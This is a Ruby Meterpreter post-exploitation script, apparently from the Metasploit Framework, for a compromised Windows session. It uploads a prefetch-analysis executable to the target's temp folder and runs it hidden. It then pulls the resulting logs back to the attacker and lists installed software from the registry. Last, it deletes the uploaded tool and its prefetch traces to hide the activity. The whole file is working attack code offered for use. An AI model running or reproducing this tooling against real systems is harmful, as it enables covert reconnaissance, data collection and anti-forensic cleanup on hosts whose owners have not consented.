#!/usr/bin/env ruby
#Meterpreter script for extracting information from windows prefetch folder
#Provided by Milo at keith.lee2012[at]gmail.com
#Verion: 0.1.0 
session = client
host,port = session.tunnel_peer.split(':')

# Script Options
@@exec_opts = Rex::Parser::Arguments.new(
        "-h" => [ false,  "Help menu."],
		"-p" => [ false,  "List Installed Programs"],                 
		"-c" => [ false,  "Disable SHA1/MD5 checksum"],                 
		"-x" => [ true,   "Top x Accessed Executables (Based on Prefetch folder)"],                 
		"-d" => [ false,  "Disable lookup for software name"],
		"-l" => [ false,  "Download Prefetch Folder Analysis Log"]
		)
tmp = session.fs.file.expand_path("%TEMP%")
imgname = sprintf("%.5d",rand(100000))
runTop = nil
logs = ''
logs1 = ''

timeoutsec = 1000
#---------------------------------------------------------------------------------------------------------
def readprogramlist(session)
 	begin
	key = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall', KEY_READ)
	sfmsvals = key.enum_key
	sfmsvals.each do |test1|
		begin			
			key2 = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\"+test1
			root_key2, base_key2 = session.sys.registry.splitkey(key2)
			value1 = "DisplayName"
			value2 = "DisplayVersion"
			open_key = session.sys.registry.open_key(root_key2, base_key2, KEY_READ)
			v1 = open_key.query_value(value1)
			v2 = open_key.query_value(value2)
			print_status("#{v1.data}\t(Version:  #{v2.data})")
		rescue 
		end
	end
	end
end

def prefetchdump(session,tmp,imgname,options,logs1,timeoutsec)
	tmpout = []
	prefetchexe = File.join(Msf::Config.install_root, "data", "prefetch.exe")
	prefetchlog = sprintf("%.5d",rand(100000))
	print_status("Uploading Prefetch-tool for analyzing Prefetch folder....")
	begin
		session.fs.file.upload_file("#{tmp}\\#{prefetchlog}.exe","#{prefetchexe}")
		print_status("Prefetch-tool uploaded as #{tmp}\\#{prefetchlog}.exe")
	rescue::Exception => e
			print_status("The following Error was encountered: #{e.class} #{e}")
	end
	session.response_timeout=timeoutsec
	
	if logs1!=''
		session = client
		host,port = session.tunnel_peer.split(':')
		logs = ::File.join(Msf::Config.config_directory, 'logs', 'prefetch', host + "-"+ ::Time.now.strftime("%Y%m%d.%M%S"))
		::FileUtils.mkdir_p(logs)
		print "[*] Saving prefetch logs to #{tmp}\\#{imgname} "
	end


	print_status("Prefetch-tool executing...")
	begin
		r = session.sys.process.execute("cmd.exe /c #{tmp}\\#{prefetchlog}.exe #{options} #{logs1}.txt", nil, {'Hidden' => 'true','Channelized' => true})
		while(d = r.channel.read)
			print_status d
		end
		sleep(2)
		prog2check = "#{prefetchlog}.exe"
		found = 0
		while found == 0
			session.sys.process.get_processes().each do |x|
				found =1
				if prog2check == (x['name'].downcase)
					print "."
					sleep(0.5)
					found = 0
				end
			end
		end
		r.channel.close
		r.close
		print "\n"
		if logs1!=""
			print_status("Finish extracting prefetch folder data")
		end
		print_status("Deleting #{prefetchlog}.exe from target...")
		session.sys.process.execute("cmd.exe /c del #{tmp}\\#{prefetchlog}.exe", nil, {'Hidden' => 'true'})
		session.sys.process.execute("cmd.exe /c del %windir%\\prefetch\\#{prefetchlog}*.pf", nil, {'Hidden' => 'true'})
		print_status("Clearing prefetch-tool prefetch entry ...")
	rescue::Exception => e
			print_status("The following error was encountered: #{e.class} #{e}")
	end
	return logs
end
#---------------------------------------------------------------------------------------------------------
def logdown(session,tmp,imgname,logs,timeoutsec)
	session.response_timeout=timeoutsec
	print_status("Downloading prefetch-tool logs to #{logs}")
	begin
		session.fs.file.download_file("#{logs}#{::File::Separator}#{imgname}.txt", "#{tmp}\\#{imgname}.txt")
		print_status("Finished downloading prefetch-tool log")
		print_status("Deleting left over files...")
		session.sys.process.execute("cmd.exe /c del #{tmp}\\#{imgname}", nil, {'Hidden' => 'true'})
		print_status("Prefetch-tool log on target deleted")
	rescue::Exception => e
			print_status("The following Error was encountered: #{e.class} #{e}")
	end
end

################## MAIN ##################
# Parsing of Option
checksum = 1
inetlookup = 1
hlp = 0
dwld = 0
options1 = ""
viewPrograms = 0

@@exec_opts.parse(args) { |opt, idx, val|
	case opt
	when "-x"
		options1 += " --x="+val
	when "-c"
		options1 += " --disable-md5 --disable-sha1"
	when "-p"
		viewPrograms = 1	
		hlp = 1
	when "-d"
		options1 += " --disable-lookup"
	when "-l"
		logs1 = " --txt=#{tmp}\\#{imgname}"
		dwld = 1
	when "-h"
		hlp = 1
		print(
		"Prefetch-tool Meterpreter Script\n" +
		@@exec_opts.usage			
		)
		break
	end
}
if (viewPrograms == 1)
	readprogramlist(session)
end

if (hlp == 0)
	print_status("Running Prefetch-tool Script.....")
	logs2 = prefetchdump(session,tmp,imgname,options1,logs1,timeoutsec)
	if (dwld == 1)
		logdown(session,tmp,imgname,logs2,timeoutsec)
	end
end

